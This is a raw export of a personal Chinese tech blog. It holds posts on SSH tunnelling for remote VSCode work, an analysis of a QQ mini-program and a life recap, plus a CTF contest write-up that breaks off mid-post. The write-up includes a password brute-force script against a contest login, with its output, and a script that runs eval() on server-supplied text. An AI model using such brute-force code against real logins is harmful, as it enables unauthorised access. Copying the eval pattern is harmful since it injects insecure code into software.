</p><p>然而我的初衷是要<strong>在一台能联网的主机C上去连接内网A</strong>的呀，不行还得再折腾一下啊呜。  </p><p>首先试了一下直接连接公网服务器B的port1，然而不可行。  </p><p>不过网上有些资料说是可行的，这个我也不知道呢，可能要问神奇的海螺吧。   </p><blockquote><p>根据网上的说法，已经在B上对<code>GatewayPorts</code>进行了设置，也杀死进程重启了服务甚至直接<code>reboot</code>了，然而不知道为啥不可行……</p></blockquote><p>不过也不是没有办法呢，ssh里还有个<strong>正向代理</strong>闲着没事干呢，说上就上吧。  </p><p>在B上继续进行如下配置</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> -fCNL  *:<span class="token operator">&lt;</span>port3<span class="token operator">></span>:localhost:<span class="token operator">&lt;</span>port1<span class="token operator">></span> localhost</code></pre><p>表示将B上的port1映射到port3，注意<strong>port3也要设置安全组规则</strong>啊。  </p><p>用<code>ss -ant</code> 看了一下，port3的确打开了。  </p><p>理论上这样的话在C上ssh连接B的port3端口，就可以直接访问到内网A了的。</p><p>如果你成功了，那就可以<strong>直接跳到配置VSCode的部分</strong>了，<strong>尽情享受远程炼丹的快感吧！</strong>  </p><p><strong>喜欢的话可以滑到页面下方，赞赏一下给我买点好吃的<em>（我饿了.jpg</em></strong>    </p><hr><p><strong>然而我并没有成功……</strong>  </p><p>看了一下安全组设置，没问题，唉，大不了全开了嘛。还是不行。  </p><p>这里我难受死了，杀死进程又重来试了好几次，一样没有效果。  </p><p>再去网上查了查，直到看到一篇文章里提到了这个问题，但他直接用的ssh而没有用到autossh，用他的方案还是没解决问题。不过里面提到了一个命令叫<code>lsof</code>，即“列出打开文件(lists openfiles)”，而在Unix中一切（包括网络套接口）都是文件。<strong>这可是个神器啊！</strong>  </p><p>这里用到的是     </p><blockquote><p>使用<code>-i :port</code>来显示与指定端口相关的网络信息。  </p></blockquote><pre class=" language-bash"><code class="language-bash"><span class="token function">lsof</span> -i :<span class="token operator">&lt;</span>port3<span class="token operator">></span>  <span class="token comment" spellcheck="true"># 查看连接port3端口的网络信息</span></code></pre><p>结果类似于这样（忘记截图了），此处port3为仅供演示所用的9988。</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># lsof -i :9988</span>COMMAND PID USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME<span class="token function">ssh</span>     658 root    4u  IPv6  146251      0t0  TCP *:9988 <span class="token punctuation">(</span>LISTEN<span class="token punctuation">)</span></code></pre><p>这里我才发现，噫，怎么只监听了IPv6，而没有IPv4啊！</p><p>实际上通过<code>ss -ant</code>也可以发现对应的端口只有tcp6而没有tcp…  </p><p>然而阿里云实例（安全组内）只有IPv4出口来着，而且也是通过IPv4连接到B的，怪不得连不上呢。（佛了  </p><p>不过也奇怪了，理论上ssh应该v4和v6都监听的吧。  </p><p>去查了一下ssh命令，这次<strong>强制使用 IPv4</strong>试试。  </p><p>（在B上杀死之前的ssh，再执行下面的命令。记得改成你的端口哈。  </p><pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> -fCNL  *:<span class="token operator">&lt;</span>port3<span class="token operator">></span>:localhost:<span class="token operator">&lt;</span>port1<span class="token operator">></span> localhost -4</code></pre><blockquote><p><code>-4</code>表示强制使用IPv4</p></blockquote><p>这回再看<code>lsof -i :&lt;port3&gt;</code>：  </p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># lsof -i :9988</span>COMMAND PID USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME<span class="token function">ssh</span>     954 root    4u  IPv4  255331      0t0  TCP *:9988 <span class="token punctuation">(</span>LISTEN<span class="token punctuation">)</span></code></pre><p>然后再在C上连接B的port3端口。</p><p><img src="/2019/12/21/Idea_RemoteProgramming/image-20191220021132045.png" alt="通过外网成功连上内网服务器"></p><p>哇哇哇成功了！  </p><p>看来果然是这个问题啊我哭了又笑了。  </p><p>下面就可以设置VSCode来实现远程炼丹啦！  </p><h2 id="Guidance-for-VSCode"><a href="#Guidance-for-VSCode" class="headerlink" title="Guidance for VSCode"></a>Guidance for VSCode</h2><p>具体可以参考<em>Reference #1</em>，这里简单操作一下。  </p><p>在VSCode安装<strong><code>Remote Development</code>开发包（扩展）</strong>，然后在远程资源管理器里新增一个SSH Target。  </p><p><img src="/2019/12/21/Idea_RemoteProgramming/image-20191220011642994.png" alt="VSCode_ssh配置"></p><p>在用户的<code>.ssh/config</code>文件内新增你的内网炼丹炉信息。</p><blockquote><p>Host 给你的内网主机起个名（看你心情随意取）<br>HostName  公网服务器B的IP或域名<br>Port 填port3，如果port1能连上就填port1<br>User 填内网服务器A的登录用户名    </p></blockquote><p>保存，然后便可以连接试一试了。  </p><p>连接后输入A对应用户的密码，然后就连上了。打开文件夹还需要再输一次密码。   </p><p>现在再用前面在B的配置里说的办法，把C主机的公钥放到A里就可以实现免密登录啦！   </p><p>呐，这就是在C上连接到内网炼丹炉的效果了↓。</p><p><img src="/2019/12/21/Idea_RemoteProgramming/image-20191220011440883.png" alt="VSCode远程炼丹效果"></p><p>网络延时几乎没有<em>（不过也取决于网络环境）</em>，和在本地编程几乎没有差别，爽到爆炸！  </p><p>哇哇哇成就感爆棚啊哇哇哇！！！</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>时间因素，不可避免可能存在一些失误之处，其中也有不少可以拓展之处，欢迎交流提出哈。  </p><p>本文<strong>仅用于学习研究，请在合理合法范围内使用</strong>，</p><p><strong>未经允许不得商用，转载请署名MiaoTony并保留本文链接</strong>，谢谢。</p><p>说点题外话吧。  </p><blockquote><p>上周末到这周部署<a href="https://github.com/miaotony/NUAA_iCal_Web" target="_blank" rel="noopener"><code>NUAA_iCal_Web</code>在线版本</a>弄了一周末（好菜啊第一次弄部署来着…），配服务器环境折腾了老半天（甚至只装好了GPU驱动和anaconda还没配CUDA），配远程炼丹又瞎折腾了一两天，写这篇文章又断断续续地花了好几个小时。  </p></blockquote><p>呜下周开始频繁考试了，不敢瞎折腾了嘤嘤嘤。（溜了溜了   </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li><a href="https://zhuanlan.zhihu.com/p/89662757" target="_blank" rel="noopener">使用vscode进行远程炼丹</a> </li><li><a href="https://www.cnblogs.com/zhongbin/p/3940956.html" target="_blank" rel="noopener">SSH反向连接使用Autossh自动ssh</a>  </li><li><a href="https://www.jianshu.com/p/3cd2793ba719" target="_blank" rel="noopener">利用阿里云ECS跳板机内网穿透- ssh</a> </li><li><a href="https://www.centos.bz/2017/08/ssh-reverse-proxy/" target="_blank" rel="noopener">SSH如何反向代理稳定穿透内网</a></li><li><a href="https://zhuanlan.zhihu.com/p/57477087" target="_blank" rel="noopener">内网穿透：在公网访问你家的 NAS</a>   （还包括<code>frp</code>相关）</li><li><a href="https://www.jianshu.com/p/85866b87c7d0" target="_blank" rel="noopener">从外网 SSH 进局域网，反向代理+正向代理</a></li><li><a href="https://www.jianshu.com/p/7accc1e485d3" target="_blank" rel="noopener">autossh 穿透，反向代理到内网</a></li><li><a href="https://blog.csdn.net/liu_qingbo/article/details/78383892" target="_blank" rel="noopener">ssh-copy-id三步实现SSH无密码登录和ssh常用命令</a></li><li><a href="https://www.jianshu.com/p/a3aa6b01b2e1" target="_blank" rel="noopener">Linux 命令神器：lsof</a></li><li><a href="https://www.oschina.net/translate/automatically-restart-ssh-sessions-and-tunnels-using-autossh" target="_blank" rel="noopener">使用 autossh 自动重启 SSH 会话和通道</a></li><li><a href="https://www.fcwys.cc/archives/371.html" target="_blank" rel="noopener">CentOS7添加开机启动服务或脚本</a></li></ol><p>etc.   </p><p>非常感谢上面这些文章，给了我很多启发呢。  </p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> ssh </tag>
            
            <tag> VSCode </tag>
            
            <tag> 远程 </tag>
            
            <tag> 编程 </tag>
            
            <tag> Server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | QQ小程序【年终报告单/2019年终总结】分析</title>
      <link href="/2019/12/04/Scrapy_2019Year-end_Report/"/>
      <url>/2019/12/04/Scrapy_2019Year-end_Report/</url>
      
        <content type="html"><![CDATA[<h2 id="缘由"><a href="#缘由" class="headerlink" title="缘由"></a>缘由</h2><p>这两天看空间各种发【我的2019年终报告】，然后我也去测了一下，没想到啥也不用填，申请获取个人信息的权限，报告就出来了。  </p><p>然而弹出一个遮罩层让你先看个15s的广告……  </p><p>超想吐槽，包括页面下面的广告。。  </p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/movie.png" alt="movie"></p><p>然后看完广告，终于出来了。  </p><p>正当我截了图返回之后，噫换个性别试试。  </p><p>好，这回不一样了呀！  </p><p>然后再来一次，噫，又不一样了……这让我怀疑他就是假的几张图片而已吧。  </p><p>我兴趣来了，不如来折腾一下，分析一下这个小程序吧。  </p><p>（不折腾会死……</p><h2 id="开始折腾"><a href="#开始折腾" class="headerlink" title="开始折腾"></a>开始折腾</h2> <a id="more"></a> <h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>先来看一看这个小程序的设置，发现只获取了<strong>用户信息</strong>。看一眼<strong>更多资料</strong>——  </p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/image1.png" alt="image1"></p><p>先确定了这是个个人开发的小程序，看相关的域名除了Tencent家的，主要就是<code>wxa.game-a1.cn</code> 和<code>free-api.heweather.com</code>。  </p><p>查了一下，后者是一个查天气的API（需要的话可以用一波）<em>（就是很迷惑为啥这里会有这个</em>  </p><p>前者是一个个人的域名吧，看样子是用的一个开发小程序的平台。根域名还是个博客，里面还有搭建微信小程序的经历。</p><hr><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>ping了一下这个域名，得到IP：<code>47.105.42.112</code>  </p><p>然后抓了个包，过滤只看关于这个IP的数据包。发现有两个。  </p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/Inked.jpg" alt="Inked"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/image2.png" alt="2"></p><p>前面一个不懂什么鬼填了个表，估计收集了一波使用数据，先不管。重点是后面这个。</p><p>很明显是访问了<code>http://wxa.game-a1.cn/wxa/qqnz2019/index.php</code>这个网址。</p><hr><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>浏览器启动，F12大法好呀。  </p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/image3.png" alt="image-20191204143118444"></p><p>好一个JSON字符串，来分析一下吧。  </p><p><code>qrcode</code>很明显是二维码啦，下载下来解码发现调用了qq小程序的接口吧，访问会跳转到这个小程序。</p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/image4.png" alt="image-20191204143437363"></p><p><code>url</code>和<code>url1</code>都是一样的，指向了一个阿里云的对象存储。↓</p><p><a href="https://oos-pic.oss-cn-beijing.aliyuncs.com/2019%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/1.png" target="_blank" rel="noopener">https://oos-pic.oss-cn-beijing.aliyuncs.com/2019%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/1.png</a></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/image5.png" alt="image-20191204143738991"></p><p>多次刷新发现好像的确就那几张图片，改变了一下<code>x.png</code>而已。  </p><p>而且的确这就是假的图啦。<em>（不然哪来的用户数据可以分析</em>  </p><hr><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>既然都知道是几张图片而已了，那顺便就爬下来吧。  </p><p>PyCharm 启动，来写一写jio本。  </p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/code.png" alt="image-20191204150348574"></p><p>写range是因为随便试了一下，本来就没有几张图片而已，然而懒得手动下载。</p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/download_imgs.png" alt="image-20191204144246023"></p><p>看结果的确就7张图片。。</p><p>呐就这几张了↓  </p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/1.png" alt="1"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/2.png" alt="2"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/3.png" alt="3"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/4.png" alt="4"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/5.png" alt="5"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/6.png" alt="6"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/7.png" alt="7"></p><hr><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p>看样子小程序获取个人头像，然后再和二维码、上面的任意一张图拼接在一起而已吧。   </p><p>就是这个<code>form.php</code>，看样子是用来统计使用数据的吧emmm问题不大。</p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/image6.png" alt="image-20191204144935029"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>哇呜折腾了一个中午好气啊，<del><em>（有毒 不折腾会死</em></del></p><p>不管怎么说这个小程序还是有点意思的，至少做的那几张图片还挺不错的哈哈哈。</p><p>不过要吐槽这个广告超级讨厌emmm</p><p>就这样吧。</p><p>爬取图片的源码 和 爬到的图片放到了Github上了，有需要的可以去看看吧。</p><p>URL：<a href="https://github.com/miaotony/Scrapy_2019Year-end_Report" target="_blank" rel="noopener">这是网址</a></p><p><a href="https://github.com/miaotony/Scrapy_2019Year-end_Report" target="_blank" rel="noopener">https://github.com/miaotony/Scrapy_2019Year-end_Report</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Analysis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> 分析 </tag>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> 小程序 </tag>
            
            <tag> 年终总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>纪念一下忙到爆炸超级难顶的十一月</title>
      <link href="/2019/12/02/Boom_2019November/"/>
      <url>/2019/12/02/Boom_2019November/</url>
      
        <content type="html"><![CDATA[<h2 id="纪念一下忙到爆炸超级难顶的十一月"><a href="#纪念一下忙到爆炸超级难顶的十一月" class="headerlink" title="纪念一下忙到爆炸超级难顶的十一月"></a>纪念一下忙到爆炸超级难顶的十一月</h2><p><del>（实在没忍住</del><br>本来就一堆事，然而有些活动还想去体验一下，不过收获倒是不少吧<br><del>（其实在作死…</del></p><p> <img src="/2019/12/02/Boom_2019November/plan.png" alt="plan"> </p> <a id="more"></a> <ul><li><p>电焊大赛 划了一波水  </p><p><img src="/2019/12/02/Boom_2019November/CircuitWeldingCompetition.jpg" alt="电焊大赛"></p></li><li><p>和师傅们玩了玩CTF（不务正业<br>到了大三才知道这个比赛嘤嘤嘤  太菜了，只拿了第六，不过有个一血还拿了个娃娃嘻嘻嘻<br>然而瞄了一眼NJUPT CTF题目，发现自己菜到爆炸。人家光是签到题就绕了好几个弯…   </p><p><img src="/2019/12/02/Boom_2019November/AsuriCTF2.jpg" alt="ctf"></p><p><img src="/2019/12/02/Boom_2019November/AsuriCTF.png" alt="ctf"></p></li><li><p>去东大打了一波Hackathon（不务正业<br>成功带飞俩学弟 拿了第四 三等奖<br> （微软爸爸真有钱，白嫖感觉超级爽233<br><img src="/2019/12/02/Boom_2019November/hackathon.JPG" alt="hackathon"><br><img src="/2019/12/02/Boom_2019November/hackathon3.png" alt="hackathon3"><br><img src="/2019/12/02/Boom_2019November/hackathon2.jpg" alt="hackathon2">   </p></li><li><p>做了持续一个月的校电赛<br>这回终于没有白给了，一等奖+最佳工程实践奖到手  </p><p><img src="/2019/12/02/Boom_2019November/NUAAEDC.jpg" alt="NUAAEDC"></p></li></ul><p>期间还有结课考试，准备大创中期材料，各种DDL，真就难顶到爆炸想自闭……  </p><p>不过要感谢超级棒的奶冰日常鼓励<br>没有奶冰的话包括<code>iCal</code>在内很多事真就很难坚持下去<br>还抑制住了我不少冲动233<br>还有陆师傅的<code>做好我们的就行了</code><br>于老板的<code>加油啊你们都大三了</code><br>焰焰的<code>先做好当下的事</code><br>一帆学弟的<code>冲冲冲</code><br>还有舍友的通情达理<br>etc.  </p><h2 id="转眼间就十二月啦"><a href="#转眼间就十二月啦" class="headerlink" title="转眼间就十二月啦"></a>转眼间就十二月啦</h2><p>这个月应该就没有比赛什么的了，不过项目进度有空还得赶一赶8<br>还要补课内欠下的一堆难到爆炸看不懂的知识<br>还有大作业、课设、实验，以及接下来几周陆续结课马上到来的考试……<br>（当然有空的话还想出去转一转（都好久没出门了嘤嘤嘤 除了去了趟SEU  </p><p>总之——<br><strong>接下来的两个月加油冲冲冲！</strong>  </p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | Asuri战队 2019招新赛 WriteUP</title>
      <link href="/2019/11/28/CTF_2019Asuri_Recruitment/"/>
      <url>/2019/11/28/CTF_2019Asuri_Recruitment/</url>
      
        <content type="html"><![CDATA[<h1 id="Asuri-招新赛WriteUP-20191117"><a href="#Asuri-招新赛WriteUP-20191117" class="headerlink" title="Asuri 招新赛WriteUP 20191117"></a>Asuri 招新赛WriteUP 20191117</h1><p>网址： <a href="http://139.9.212.218:8000/challenges" target="_blank" rel="noopener">http://139.9.212.218:8000/challenges</a>  </p><p>官方安排及WriteUP：<a href="https://github.com/Kit4y/2019-Asuri-Recruitment-Src-and-wp" target="_blank" rel="noopener">https://github.com/Kit4y/2019-Asuri-Recruitment-Src-and-wp</a>  </p><h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p><code>flag{this_is_test_flag}</code> </p><h2 id="misc-签到"><a href="#misc-签到" class="headerlink" title="misc-签到"></a>misc-签到</h2><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117185210292.png" alt="misc"></p><p>base64解码即得到</p><p><code>flag{1_want_jiamus_p0wer}</code>  </p><h2 id="baby-web-九曲十八弯"><a href="#baby-web-九曲十八弯" class="headerlink" title="baby-web-九曲十八弯"></a>baby-web-九曲十八弯</h2><p> <a href="http://desperadoccy.club:39011/" target="_blank" rel="noopener">http://desperadoccy.club:39011/</a> </p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117185108626.png" alt="image-20191117185108626"></p><p>base64解码</p><p><code>Asuri{view_source's_power}</code></p><h2 id="快速计算"><a href="#快速计算" class="headerlink" title="快速计算"></a>快速计算</h2><p> <a href="http://47.102.107.100:39012/" target="_blank" rel="noopener">http://47.102.107.100:39012/</a> </p> <a id="more"></a> <p>连续20次在1-2s内判断是否正确，即可得到flag。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> times <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://47.102.107.100:39012/"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    equation <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'&lt;div>(.*)=(.*)&lt;/div>'</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>equation<span class="token punctuation">)</span>    answer <span class="token operator">=</span> eval<span class="token punctuation">(</span>equation<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> answer <span class="token operator">==</span> eval<span class="token punctuation">(</span>equation<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        values <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'answer'</span><span class="token punctuation">:</span> <span class="token string">'true'</span><span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        values <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'answer'</span><span class="token punctuation">:</span> <span class="token string">'false'</span><span class="token punctuation">}</span>    r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://47.102.107.100:39012/"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>values<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117195746861.png" alt="image-20191117195746861"></p><p><code>Asuri{python_1s_th3_be3t_l4ngu4ge}</code></p><h2 id="medium-web-justburp"><a href="#medium-web-justburp" class="headerlink" title="medium_web_justburp"></a>medium_web_justburp</h2><p> <a href="http://139.9.212.218:39010/" target="_blank" rel="noopener">http://139.9.212.218:39010/</a> </p><p>查找网站目录下的文件</p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117204536434.png" alt="image-20191117204536434"></p><p>访问<code>robots.txt</code> 得到：  </p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117212248603.png" alt="image-20191117212248603"></p><p>访问<code>hint.php</code> 得到一个文件  </p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117212350116.png" alt="image-20191117212350116"></p><p>尝试以<code>admin</code>作为用户名，用以上信息作为密码写脚本进行登录，  </p><p>然而好像没有成功（有可能有成功的没看到？？？  </p><blockquote><p>难受了，现场写的时候脑乱了，把所有登录数据都打印出来了，然后没找到flag…<br>加一个if重新来就看到了惹emmm</p></blockquote><p><strong>爆破一波</strong></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span><span class="token keyword">import</span> requestss <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://139.9.212.218:39010/index.php"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">"utf-8"</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'name-pass.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> file<span class="token punctuation">:</span>    contents <span class="token operator">=</span> file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># print(contents)</span>    passwords <span class="token operator">=</span> contents<span class="token keyword">for</span> password <span class="token keyword">in</span> passwords<span class="token punctuation">:</span>    values <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'admin'</span><span class="token punctuation">,</span>              <span class="token string">'password'</span><span class="token punctuation">:</span> password<span class="token punctuation">}</span>    r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://139.9.212.218:39010/index.php"</span><span class="token punctuation">,</span> params<span class="token operator">=</span>values<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>    <span class="token keyword">if</span> <span class="token string">'密码错误'</span> <span class="token operator">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p>即可得到</p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Hi hacker<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">bgcolor</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bisque<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>用户名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>密码：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>登陆<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>hint:admin用户的密码似乎在某个页面里 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>看你骨骼精奇，就将flag交于你了！Asuri{Burp_1s_Gre@t}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>flag:  <code>Asuri{Burp_1s_Gre@t}</code></p><blockquote><p>其实这题用BurpSuite更快，导入字典直接爆破都不用自己写jio本。。<br>然而我现场还在搜它怎么用……</p></blockquote><h2 id="hard-web-php是世界上最好的语言"><a href="#hard-web-php是世界上最好的语言" class="headerlink" title="hard_web_php是世界上最好的语言"></a>hard_web_php是世界上最好的语言</h2><p> <a href="http://139.9.212.218:39009/" target="_blank" rel="noopener">http://139.9.212.218:39009/</a> </p><p>改cookie重发</p><p><img 